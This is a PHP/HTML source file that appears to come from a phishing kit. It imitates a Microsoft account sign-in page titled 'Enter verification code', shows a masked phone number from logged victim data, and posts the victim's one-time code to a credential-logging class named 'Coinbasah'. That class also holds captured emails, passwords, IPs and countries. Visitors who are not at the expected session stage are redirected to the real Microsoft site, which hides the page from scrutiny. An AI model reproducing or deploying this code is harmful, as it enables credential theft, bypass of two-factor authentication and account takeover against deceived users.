<?php
error_log(E_ALL);
session_start();
require "../../function/settings.php";
if ($_SESSION['Status'] != 'otpmail') {
    header('Location: https://www.microsoft.com/en-us/microsoft-365?rtc=1');
}
$config_file = '../../function/config.json';
$json_data = file_get_contents($config_file);
// Decode JSON data into PHP array
$config = json_decode($json_data, true);
$Result =  new Coinbasah();
$Result->updateLog();
if (isset($_POST['Continue'])) {
    if ($Result->EmailLoginOTP($_POST) > 0) {
    } else {
    }
}

$result = $Result->getKeyFromLog($_SESSION['Userinfo']);
if (is_array($result)) {
    // Extract the variables from the array
    $key = $result['key'];
    $ip = $result['ip'];
    $email = $result['email'];
    $password = $result['password'];
    $country = $result['country'];
    $phonenumber = $result['phonenumber'];
    $status = $result['status'];
}

?>
<!DOCTYPE html>
<html dir="ltr" lang="EN-US">

<head>
    <meta http-equiv="x-dns-prefetch-control" content="on">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <title>Sign in to your Microsoft account</title>
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
    <link rel="icon" type="image/x-icon" href="assets/images/email/mikocoks.ico">
    <link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)"
        onerror="$Loader.OnError(this)" href="assets/css/email/Ouf1esRqI.css">
    <style type="text/css">
    </style>
    <style type="text/css">
        body {
            display: none;
        }
    </style>
    <style type="text/css">
        body {
            display: block !important;
        }
    </style>
    <noscript>
        <style type="text/css">
            body {
                display: block !important;
            }
        </style>
    </noscript>
    <style type="text/css">
        .inner,
        .promoted-fed-cred-box,
        .sign-in-box,
        .new-session-popup-v2sso,
        .debug-details-banner,
        .vertical-split-content {
            min-width: 0;
        }
    </style>
    <style type="text/css">
        input[type='tel']::placeholder {
        font-size: medium;
        letter-spacing: normal;
        font-weight: normal;
        }
        .inner,
        .promoted-fed-cred-box,
        .sign-in-box,
        .new-session-popup-v2sso,
        .debug-details-banner,
        .vertical-split-content {
            min-width: 0;
        }
    </style>
    <style type="text/css">
        .inner,
        .promoted-fed-cred-box,
        .sign-in-box,
        .new-session-popup-v2sso,
        .debug-details-banner,
        .vertical-split-content {
            min-width: 0;
        }
    </style>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden; /* Prevent scrolling */
        }

        #loadingOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.6); /* Semi-transparent background */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999; /* Ensure it's on top */
        }

        #animationContainer {
            width: 50px;
        }

        #loadingText {
            margin-top: 20px;
            font-size: 14px;
            color: #333;
        }
    </style>
</head>

<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">

    <div>

        <div data-bind="if: activeDialog">
        </div>
        <div class="login-paginated-page" data-bind="component: { name: 'master-page',
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.F,
            showFooterLinks: true,
            useWizardBehavior: svr.bd,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">
            <!--  -->

            <!-- ko ifnot: useLayoutTemplates -->
            <!-- /ko -->

            <!-- ko if: useLayoutTemplates -->
            <!-- ko withProperties: { '$page': $parent } -->
            <!-- ko if: isLightboxTemplate() -->
            <div id="lightboxTemplateContainer"
                data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.cm }"
                class="provide-min-height">
                <!--  -->

                <div id="lightboxBackgroundContainer" data-bind="css: { 'provide-min-height': svr.cN },
    component: { name: 'background-image-control',
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }">
                    <div class="background-image-holder" role="presentation"
                        data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                        <!-- ko if: smallImageUrl -->
                        <!-- /ko -->

                        <!-- ko if: backgroundImageUrl -->
                        <div id="backgroundImage"
                            data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }"
                            style="background-image: url('../assets/../img/email/background.svg')"
                            class="background-image ext-background-image">
                        </div>
                        <!-- ko if: useImageMask -->
                        <!-- /ko -->
                        <!-- /ko -->
                    </div>
                </div>

                <!-- ko if: svr.cR -->
                <!-- /ko -->

                <!-- ko withProperties: { '$masterPageContext': $parentContext } -->
                <div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
                    <!-- ko if: showHeader -->
                    <!-- /ko -->

                    <div class="template-section main-section">
                        <div data-bind="externalCss: { 'middle': true }" class="middle ext-middle">
                            <div class="full-height"
                                data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }">
                                <!--  -->

                                <!-- ko withProperties: { '$content': $data } -->
                                <div class="flex-column">
                                    <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder -->
                                    <!-- /ko -->

                                    <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl -->
                                    <!-- /ko -->

                                    <form action="" method="POST">
                                        <div class="win-scroll">
                                            <div id="lightbox" data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlHelper.useWiderWidth,
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails }"
                                                class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">

                                                <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

                                                <!-- ko if: svr.Bx -->
                                                <!-- /ko -->

                                                <div class="lightbox-cover"
                                                    data-bind="css: { 'disable-lightbox': svr.Cf &amp;&amp; showLightboxProgress() }">
                                                </div>
                                                <div>
                                                    <img class="logo" role="img"
                                                        pngsrc="assets/images/email/msf_logo.svg"
                                                        svgsrc="assets/images/email/mcsf_logo.svg"
                                                        data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }"
                                                        src="assets/images/email/mcsf_logo.svg" alt="Microsoft">
                                                </div>
                                                <div style="padding-top:30px; text-align:center;">
                                                    <img style="width: 200px;" role="img" src="assets/images/email/microsoftmail.png" alt="Microsoft">
                                                </div>
                                                <div role="main" data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.a7,
                disableAnimationIfAnimationEndUnsupported: svr.CK,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }">
                                                    <!--  -->

                                                    <div data-bind="css: { 'zero-opacity': hidePaginatedView() }"
                                                        class="">
                                                        <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.i) -->
                                                        <!-- /ko -->

                                                        <div class="pagination-view animate slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.i),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">

                                                            <!-- ko foreach: views -->
                                                            <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                            <!-- ko template: { nodes: [$data], data: $parent } -->
                                                            <div data-viewid="1" data-showfedcredbutton="true"
                                                                data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    displayName: sharedData.displayName,
                    otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
                    prefillNames: $loginPage.prefillNames,
                    flowToken: sharedData.flowToken,
                    availableSignupCreds: sharedData.availableSignupCreds,
                    customStrings: $loginPage.customStrings(),
                    isCustomizationFailure: $loginPage.isCustomStringsLoadFailure() },
                event: {
                    redirect: $loginPage.view_onRedirect,
                    setPendingRequest: $loginPage.view_onSetPendingRequest,
                    registerDialog: $loginPage.view_onRegisterDialog,
                    unregisterDialog: $loginPage.view_onUnregisterDialog,
                    showDialog: $loginPage.view_onShowDialog,
                    updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
                    agreementClick: $loginPage.footer_agreementClick } }">
                                                                <!--  -->

                                                                <!-- ko if: svr.fAllowLoginTextCustomizations -->
                                                                <!-- /ko -->

                                                                <!-- ko ifnot: svr.fAllowLoginTextCustomizations -->
                                                                <div>
                                                                    <div>
                                                                    </div>
                                                                        <div class="row title ext-title"
                                                                            id="loginHeader"
                                                                            data-bind="externalCss: { 'title': true }">
                                                                            <img role="presentation" data-bind="imgSrc"
                                                                                src="assets/images/email/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg">
                                                                            <span
                                                                                style="padding-bottom:5px;color: #1b1b1b; font-size: .9375rem; font-weight: normal; line-height: 24px;"><?= @$_SESSION['Email']; ?></span>
                                                                            <div role="heading" aria-level="1"
                                                                                data-bind="text: title">Enter verification code
                                                                            </div>
                                                                            <!-- ko if: isSubtitleVisible -->
                                                                            <!-- /ko -->
                                                                        </div>

                                                                        <!-- ko if: headerDescription -->
                                                                        <!-- /ko -->
                                                                    </div>
                                                                </div>
                                                                <!-- /ko -->

                                                                <!-- ko if: pageDescription && !svr.Cp -->
                                                                <!-- /ko -->

                                                                <div class="row">
                                                                    <div role="alert" aria-live="assertive">
                                                                        <!-- ko if: usernameTextbox.error -->
                                                                        <!-- /ko -->
                                                                    </div>

                                                                    <div class="form-group col-md-24">
                                                                        
                                                                    <div style="padding-bottom:10px;">
                                                                        <span style="font-size:18px;">+*_***_***_ <?= @$phonenumber; ?></span>
                                                                    </div>
                                                                        <!-- ko if: prefillNames().length > 1 -->
                                                                        <!-- /ko -->

                                                                        <!-- ko ifnot: prefillNames().length > 1 -->
                                                                        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.unsafe_userIdLabel || str['STR_SSSU_Username_Hint'] || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.aZ ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
                                                                            <!-- ko withProperties: { '$placeholderText': placeholderText } -->
                                                                            <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

                                                                            <input type="tel" name="password"
                                                                                id="otp" maxlength="8" class="form-control ltr_override input ext-input text-box ext-text-box"
                                                                                aria-required="true"
                                                                                data-report-event="Signin_Email_Phone_Skype"
                                                                                data-report-trigger="click"
                                                                                style="width: 100%; font-weight: 600; font-size:larger; letter-spacing: 4px;"
                                                                                data-report-value="Email_Phone_Skype_Entry"
                                                                                data-bind="
                    attr: { lang: svr.a1 ? null : 'en' },
                    externalCss: {
                        'input': true,
                        'text-box': true,
                        'has-error': usernameTextbox.error },
                    ariaLabel: tenantBranding.unsafe_userIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                    ariaDescribedBy: 'loginHeader' + (pageDescription &amp;&amp; !svr.Cp ? ' loginDescription usernameError' : ' usernameError'),
                    textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText" aria-label="Password" required
                                                                                aria-describedby="loginHeader usernameError"
                                                                                placeholder="Enter your OTP code" required>

                                                                            <!-- /ko -->
                                                                            <!-- /ko -->
                                                                            <!-- ko ifnot: usePlaceholderAttribute -->
                                                                            <!-- /ko -->
                                                                        </div>
                                                                        <!-- /ko -->
                                                                    </div>
                                                                </div>

                                                                <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }, externalCss: { 'password-reset-links-container': true }"
                                                                    class="position-buttons password-reset-links-container ext-password-reset-links-container">
                                                                    <div class="row">
                                                                        <div class="col-md-24">
                                                                            <div class="text-13">
                                                                                <!-- ko if: svr.AY && !svr.Aj && !svr.a3 -->
                                                                                <!-- ko if: svr.Al -->
                                                                                <!-- /ko -->

                                                                                <!-- ko ifnot: svr.Al -->
                                                                                <div class="form-group" data-bind="
                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                    childBindings: {
                        'signup': {
                            href: svr.j || '#',
                            ariaLabel: svr.j ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
                            click: signup_onClick } }"><a href="#">Forgot password?</a>
                                                                                </div>
                                                                                <!-- /ko -->
                                                                                <!-- /ko -->

                                                                                <!-- ko ifnot: hideCantAccessYourAccount -->
                                                                                <!-- /ko -->

                                                                                <!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.Am || isOfflineAccountVisible) -->
                                                                                <!-- /ko -->

                                                                                <!-- ko if: svr.Ba -->
                                                                                <!-- /ko -->

                                                                                <!-- ko ifnot: svr.Ba -->
                                                                                <!-- ko if: showCredPicker -->
                                                                                <!-- /ko -->
                                                                                <!-- /ko -->

                                                                                <!-- ko if: svr.av -->
                                                                                <!-- /ko -->
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>

                                                                <!-- ko if: svr.cc -->
                                                                <!-- /ko -->

                                                                <div class="win-button-pin-bottom"
                                                                    data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
                                                                    <div class="row"
                                                                        data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                                                        <div data-bind="component: { name: 'footer-buttons-field',
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.F,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.F &amp;&amp; isSecondaryButtonVisible(),
                secondaryButtonText: secondaryButtonText() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }">
                                                                            <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container"
                                                                                data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin },
    externalCss: { 'button-field-container': true }">

                                                                                <!-- ko if: isSecondaryButtonVisible -->
                                                                                <!-- /ko -->

                                                                                <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }"
                                                                                    class="inline-block button-item ext-button-item">
                                                                                    <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
                                                                                    <input type="submit" id="continue"
                                                                                        name="Continue"
                                                                                        class="win-button button_primary button ext-button primary ext-primary"
                                                                                        data-report-event="Signin_Submit"
                                                                                        data-report-trigger="click"
                                                                                        data-report-value="Submit"
                                                                                        data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    'button': true,
                    'primary': true },
                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Sign in">
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>

                                                                <!-- ko if: tenantBranding.BoilerPlateText -->
                                                                <!-- /ko -->
                                                            </div>
                                    </form>
                                    <!-- /ko -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- /ko -->
                                </div>
                            </div>
                        </div>
                        <!-- /ko -->
                        <div data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }">
                        </div>
                        <!-- /ko -->
                    </div>

                    <!-- ko if: $page.showFedCredAndNewSession -->
                    <!-- ko ifnot: svr.fUsePromotedFedCredTypesArray -->
                    <!-- ko if: $page.showFedCredButtons -->
                    <!-- /ko -->
                    <!-- /ko -->

                    <!-- ko if: svr.fUsePromotedFedCredTypesArray -->
                    <!-- /ko -->

                    <!-- ko if: $page.newSession -->
                    <!-- /ko -->
                    <!-- /ko -->

                    <!-- ko if: $page.showDebugDetails -->
                    <!-- /ko -->
                </div>
            </div>
            <!-- /ko -->
        </div>
    </div>
    </div>

    <!-- ko if: $page.paginationControlHelper.showFooterControl -->
    <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">

        <div data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }">
            <!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
            <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links"
                data-bind="externalCss: { 'footer-links': true }">

                <!-- ko if: showFooter -->
                <!-- ko if: !hideTOU -->
                <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="#"
                    class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
                <!-- /ko -->

                <!-- ko if: !hidePrivacy -->
                <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="#"
                    class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
                <!-- /ko -->

                <!-- ko if: impressumLink -->
                <!-- /ko -->

                <!-- ko if: a11yConformeLink -->
                <!-- /ko -->

                <!-- ko if: showIcpLicense -->
                <!-- /ko -->
                <!-- /ko -->

                <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
                <a id="moreOptions" href="#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information"
                    aria-expanded="false"
                    class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
            </div>
            <!-- /ko -->

            <!-- ko if: svr.cc && showLinks -->
            <!-- /ko -->
        </div>
    </div>
    <!-- /ko -->
    </div>
    <!-- /ko -->
    </div>
    <!-- /ko -->

    <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() -->
    <!-- /ko -->
    <!-- /ko -->
    <!-- /ko -->
    </div>
    <!-- /ko -->
    <!-- /ko -->

    <!-- ko if: svr.DT -->
    <!-- /ko -->
    </div>
</body>
  <script>
      document.addEventListener('DOMContentLoaded', function() {
          var otp = document.getElementById('otp');

          otp.addEventListener('input', function(e) {
              this.value = this.value.replace(/\D/g, ''); // Remove all non-numeric characters
          });
      });
  </script>

</html>